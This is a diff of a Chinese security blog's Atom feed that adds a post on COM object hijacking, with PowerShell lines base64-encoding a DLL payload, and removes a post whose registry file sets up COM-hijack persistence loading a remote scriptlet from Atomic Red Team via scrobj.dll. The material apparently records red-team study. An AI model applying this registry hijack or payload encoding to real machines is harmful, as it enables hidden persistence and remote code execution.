@@ -57,6 +57,28 @@
   </entry>
   
   <entry>
+    <title>com_xml</title>
+    <link href="www.ggsec.cn/com-xml.html"/>
+    <id>www.ggsec.cn/com-xml.html</id>
+    <published>2018-09-04T13:14:02.000Z</published>
+    <updated>2018-09-04T14:07:34.000Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="http://oc78wb8cz.bkt.clouddn.com/IMG_20180904_211723.jpg" alt="enter description here"><br><a id="more"></a></p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=16483445&auto=1&height=66"></iframe><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p><p><script type="text/javascript" src="http://7xjfim.com2.z0.glb.qiniucdn.com/Iva.js"></script></p><p><script><br>    var ivaInstance = new Iva(‘ivaLive’, {<br>        appkey: ‘By9WGzBIx’, //应用标示<br>        video: ‘<a href="http://oc78wb8cz.bkt.clouddn.com/COM%E5%8A%AB%E6%8C%81.mp4&#39;">http://oc78wb8cz.bkt.clouddn.com/COM%E5%8A%AB%E6%8C%81.mp4&#39;</a>, //视频<br>        title: ‘test’, //视频标题，后台视频管理中的标题<br>        cover: ‘’ //视频封面，只有在autoplay:false才可生效<br>    });<br></script></p><p><script src="//cytroncdn.videojj.com/latest/Iva.js"></script><br><a href="https://github.com/3gstudent/COM-Object-hijacking" target="_blank" rel="noopener">https://github.com/3gstudent/COM-Object-hijacking</a></p><p>不知不觉这条安全道路走快两年了，这博客记录我的学习记录，加油！</p><p>payload 加密</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\demon&gt; <span class="variable">$fileContent</span> = [System<span class="selector-class">.IO</span><span class="selector-class">.File</span>]::ReadAllBytes(<span class="string">'C:\Users\demon\Desktop\calcmutex.dll'</span>)</span><br><span class="line">PS C:\Users\demon&gt; $fileContentEncoded = [System.Convert]::ToBase64String($fileContent)| set-content ("123.txt")</span><br></pre></td></tr></table></figure><p><a href="http://www.4hou.com/technology/4958.html" target="_blank" rel="noopener">http://www.4hou.com/technology/4958.html</a><br><a href="https://github.com/3gstudent/test/blob/master/calcmutex.dll" target="_blank" rel="noopener">https://github.com/3gstudent/test/blob/master/calcmutex.dll</a></p><p><img src="http://oc78wb8cz.bkt.clouddn.com/1536070047935.jpg" alt="enter description here"></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;img src=&quot;http://oc78wb8cz.bkt.clouddn.com/IMG_20180904_211723.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
+    
+    </summary>
+    
+      <category term="Windows" scheme="www.ggsec.cn/categories/Windows/"/>
+    
+    
+      <category term="Windows" scheme="www.ggsec.cn/tags/Windows/"/>
+    
+  </entry>
+  
+  <entry>
     <title>Propagate</title>
     <link href="www.ggsec.cn/propagate.html"/>
     <id>www.ggsec.cn/propagate.html</id>
@@ -83,7 +105,7 @@
     <link href="www.ggsec.cn/Ghost-tunnel.html"/>
     <id>www.ggsec.cn/Ghost-tunnel.html</id>
     <published>2018-09-04T11:51:17.000Z</published>
-    <updated>2018-09-04T13:09:12.000Z</updated>
+    <updated>2018-09-04T13:14:40.000Z</updated>
     
     <content type="html"><![CDATA[<p><img src="http://oc78wb8cz.bkt.clouddn.com/IMG_20180904_195606.jpg" alt="enter description here"><br><a id="more"></a></p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=2009803&auto=1&height=66"></iframe><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p><script type="text/javascript" src="http://7xjfim.com2.z0.glb.qiniucdn.com/Iva.js"></script><script>    var ivaInstance = new Iva('ivaLive', {        appkey: 'By9WGzBIx', //应用标示        video: 'http://oc78wb8cz.bkt.clouddn.com/ghostunnel.mp4', //视频        title: 'test', //视频标题，后台视频管理中的标题        cover: '' //视频封面，只有在autoplay:false才可生效    });</script><script src="//cytroncdn.videojj.com/latest/Iva.js"></script><p><a href="https://github.com/360PegasusTeam/GhostTunnel" target="_blank" rel="noopener">https://github.com/360PegasusTeam/GhostTunnel</a></p>]]></content>
     
@@ -93,6 +115,10 @@
     
     </summary>
     
+      <category term="Windows" scheme="www.ggsec.cn/categories/Windows/"/>
+    
+    
+      <category term="Windows" scheme="www.ggsec.cn/tags/Windows/"/>
     
   </entry>
   
@@ -404,28 +430,6 @@
     <summary type="html">
     
       &lt;p&gt;&lt;img src=&quot;http://oc78wb8cz.bkt.clouddn.com/111B9E88668CCEEF802CA5E4F80BEF12.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
-    
-    </summary>
-    
-      <category term="Windows" scheme="www.ggsec.cn/categories/Windows/"/>
-    
-    
-      <category term="Windows" scheme="www.ggsec.cn/tags/Windows/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>winlogon_regedit</title>
-    <link href="www.ggsec.cn/winlogon-regedit.html"/>
-    <id>www.ggsec.cn/winlogon-regedit.html</id>
-    <published>2018-02-12T12:12:01.000Z</published>
-    <updated>2018-07-01T06:43:30.000Z</updated>
-    
-    <content type="html"><![CDATA[<p><img src="http://oc78wb8cz.bkt.clouddn.com/IMG_20180212_201037.jpg" alt="enter description here"><br><a id="more"></a></p><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p><script type="text/javascript" src="http://7xjfim.com2.z0.glb.qiniucdn.com/Iva.js"></script><script>    var ivaInstance = new Iva('ivaLive', {        appkey: 'By9WGzBIx', //应用标示        video: 'http://oc78wb8cz.bkt.clouddn.com/winlogon.mp4', //视频        title: 'test', //视频标题，后台视频管理中的标题        cover: '' //视频封面，只有在autoplay:false才可生效    });</script><script src="//cytroncdn.videojj.com/latest/Iva.js"></script><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Microsoft组件对象模型（COM）是Windows内的一个系统，用于通过操作系统实现软件组件之间的交互。</span><br><span class="line"><span class="number">1</span>攻击者可以使用这个系统插入恶意代码，通过劫持COM引用和关系来代替合法的软件来执行持久化。</span><br><span class="line">劫持COM对象需要在Windows注册表中进行更改，以将引用替换为可能导致该组件在执行时无法工作</span><br><span class="line">的合法系统组件。当系统组件通过正常的系统操作执行时，攻击者的代码将被执行。<span class="number">2</span> 攻击者很可能劫</span><br><span class="line">持足够频繁使用的对象来保持一致的持久性水平，但不可能在系统内破坏明显的功能，以避免可能导致</span><br><span class="line">检测的系统不稳定。</span><br></pre></td></tr></table></figure><h2 id="winlogon-reg"><a href="#winlogon-reg" class="headerlink" title="winlogon.reg"></a>winlogon.reg</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version <span class="number">5.00</span></span><br><span class="line">[HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicRedTeam.<span class="number">1.00</span>]</span><br><span class="line">@=<span class="string">"AtomicRedTeam"</span></span><br><span class="line">[HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicRedTeam.<span class="number">1.00</span>\CLSID]</span><br><span class="line">@=<span class="string">"&#123;00000001-0000-0000-0000-0000FEEDACDC&#125;"</span></span><br><span class="line">[HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicRedTeam]</span><br><span class="line">@=<span class="string">"AtomicRedTeam"</span></span><br><span class="line">[HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicRedTeam\CLSID]</span><br><span class="line">@=<span class="string">"&#123;00000001-0000-0000-0000-0000FEEDACDC&#125;"</span></span><br><span class="line">[HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\&#123;<span class="number">00000001</span>-<span class="number">0000</span>-<span class="number">0000</span>-<span class="number">0000</span>-<span class="number">0000</span>FEEDACDC&#125;]</span><br><span class="line">@=<span class="string">"AtomicRedTeam"</span></span><br><span class="line">[HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\&#123;<span class="number">00000001</span>-<span class="number">0000</span>-<span class="number">0000</span>-<span class="number">0000</span>-<span class="number">0000</span>FEEDACDC&#125;\InprocServer32]</span><br><span class="line">@=<span class="string">"C:\\WINDOWS\\system32\\scrobj.dll"</span></span><br><span class="line"><span class="string">"ThreadingModel"</span>=<span class="string">"Apartment"</span></span><br><span class="line">[HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\&#123;<span class="number">00000001</span>-<span class="number">0000</span>-<span class="number">0000</span>-<span class="number">0000</span>-<span class="number">0000</span>FEEDACDC&#125;\ProgID]</span><br><span class="line">@=<span class="string">"AtomicRedTeam.1.00"</span></span><br><span class="line">[HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\&#123;<span class="number">00000001</span>-<span class="number">0000</span>-<span class="number">0000</span>-<span class="number">0000</span>-<span class="number">0000</span>FEEDACDC&#125;\ScriptletURL]</span><br><span class="line">@=<span class="string">"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Windows/Payloads/COMHijackScripts/AtomicRedTeam.sct"</span></span><br><span class="line">[HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\&#123;<span class="number">00000001</span>-<span class="number">0000</span>-<span class="number">0000</span>-<span class="number">0000</span>-<span class="number">0000</span>FEEDACDC&#125;\VersionIndependentProgID]</span><br><span class="line">@=<span class="string">"AtomicRedTeam"</span></span><br><span class="line">[HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\&#123;<span class="number">06</span>DA0625-<span class="number">9701</span>-<span class="number">43</span>DA-BFD7-FBEEA2180A1E&#125;]</span><br><span class="line">[HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\&#123;<span class="number">06</span>DA0625-<span class="number">9701</span>-<span class="number">43</span>DA-BFD7-FBEEA2180A1E&#125;\TreatAs]</span><br><span class="line">@=<span class="string">"&#123;00000001-0000-0000-0000-0000FEEDACDC&#125;"</span></span><br></pre></td></tr></table></figure><p><img src="http://oc78wb8cz.bkt.clouddn.com/1518437671161.jpg" alt="enter description here"><br><a href="https://twitter.com/subTee/status/962767403464577024" target="_blank" rel="noopener">https://twitter.com/subTee/status/962767403464577024</a><br><a href="https://attack.mitre.org/wiki/Technique/T1122" target="_blank" rel="noopener">https://attack.mitre.org/wiki/Technique/T1122</a><br><a href="https://gist.github.com/anonymous/3929d9df4035abec725bcdc36659fce5" target="_blank" rel="noopener">https://gist.github.com/anonymous/3929d9df4035abec725bcdc36659fce5</a></p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;&lt;img src=&quot;http://oc78wb8cz.bkt.clouddn.com/IMG_20180212_201037.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
     
     </summary>
     
